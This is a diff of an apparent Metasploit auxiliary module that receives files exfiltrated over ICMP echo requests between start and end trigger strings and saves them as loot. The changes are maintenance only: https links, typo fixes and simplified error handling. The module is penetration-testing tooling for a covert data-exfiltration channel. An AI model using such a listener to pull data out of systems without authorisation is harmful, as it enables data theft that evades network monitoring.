@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Capture
   include Msf::Auxiliary::Report
 
@@ -19,7 +16,7 @@ class MetasploitModule < Msf::Auxiliary
 
         To use this module you will need to send an initial ICMP echo request containing the
         specific start trigger (defaults to '^BOF') this can be followed by the filename being sent (or
-        a random filename can be assisnged). All data received from this source will automatically
+        a random filename can be assigned). All data received from this source will automatically
         be added to the receive buffer until an ICMP echo request containing a specific end trigger
         (defaults to '^EOL') is received.
 
@@ -34,9 +31,9 @@ class MetasploitModule < Msf::Auxiliary
           # packetfu
           ['URL','https://github.com/todb/packetfu'],
           # nping
-          ['URL', 'http://nmap.org/book/nping-man.html'],
+          ['URL', 'https://nmap.org/book/nping-man.html'],
           # simple icmp
-          ['URL', 'http://blog.c22.cc/2012/02/17/quick-post-fun-with-python-ctypes-simpleicmp/']
+          ['URL', 'https://blog.c22.cc/2012/02/17/quick-post-fun-with-python-ctypes-simpleicmp/']
         ]
     )
 
@@ -49,13 +46,13 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('BPF_FILTER',    [true, 'BFP format filter to listen for', 'icmp']),
       OptString.new('INTERFACE',     [false, 'The name of the interface']),
       OptBool.new('FNAME_IN_PACKET', [true, 'Filename presented in first packet straight after START_TRIGGER', true])
-    ], self.class)
+    ])
 
     register_advanced_options([
       OptEnum.new('CLOAK',      [true, 'OS fingerprint to use for packet creation', 'linux', ['windows', 'linux', 'freebsd']]),
       OptBool.new('PROMISC',    [true, 'Enable/Disable promiscuous mode', false]),
       OptAddress.new('LOCALIP', [false, 'The IP address of the local interface'])
-    ], self.class)
+    ])
 
     deregister_options('SNAPLEN','FILTER','PCAPFILE','RHOST','SECRET','GATEWAY_PROBE_HOST', 'GATEWAY_PROBE_PORT', 'TIMEOUT')
   end
@@ -64,7 +61,7 @@ class MetasploitModule < Msf::Auxiliary
     begin
       # check Pcaprub is up to date
       if not netifaces_implemented?
-        print_error("WARNING : Pcaprub is not uptodate, some functionality will not be available")
+        print_error("WARNING : Pcaprub is not up-to-date, some functionality will not be available")
         netifaces = false
       else
         netifaces = true
@@ -125,7 +122,7 @@ class MetasploitModule < Msf::Auxiliary
           # -(Windows) netsh firewall set opmode mode = ENABLE
 
           if packet.icmp_type == 0 and packet.icmp_code == 0 and packet.ip_saddr == @iface_ip
-            print_error "Dectected ICMP echo response. You must either disable ICMP handling"
+            print_error "Detected ICMP echo response. You must either disable ICMP handling"
             print_error "or try a more restrictive BPF filter. You might try:"
             print_error " set BPF_FILTER icmp and not src #{datastore['LOCALIP']}"
             return
@@ -156,7 +153,7 @@ class MetasploitModule < Msf::Auxiliary
           icmp_response, contents = icmp_packet(packet, datastore['RESP_START'])
 
           if not icmp_response
-            raise RuntimeError ,"Could not build ICMP response"
+            raise "Could not build ICMP response"
           else
             # send response packet icmp_pkt
             send_icmp(icmp_response, contents)
@@ -167,7 +164,7 @@ class MetasploitModule < Msf::Auxiliary
 
           if data =~ /#{datastore['END_TRIGGER']}/
             # end of file marker found
-            print_status("#{@record_data.length} bytes of data recevied in total")
+            print_status("#{@record_data.length} bytes of data received in total")
             print_good("End of File received. Saving \"#{@filename}\" to loot")
             store_file
 
@@ -175,7 +172,7 @@ class MetasploitModule < Msf::Auxiliary
             icmp_response, contents = icmp_packet(packet, datastore['RESP_END'])
 
             if not icmp_response
-              raise RuntimeError , "Could not build ICMP response"
+              raise "Could not build ICMP response"
             else
               # send response packet icmp_pkt
               send_icmp(icmp_response, contents)
@@ -195,7 +192,7 @@ class MetasploitModule < Msf::Auxiliary
             icmp_response, contents = icmp_packet(packet, datastore['RESP_CONT'])
 
             if not icmp_response
-              raise RuntimeError , "Could not build ICMP response"
+              raise "Could not build ICMP response"
             else
               # send response packet icmp_pkt
               send_icmp(icmp_response, contents)
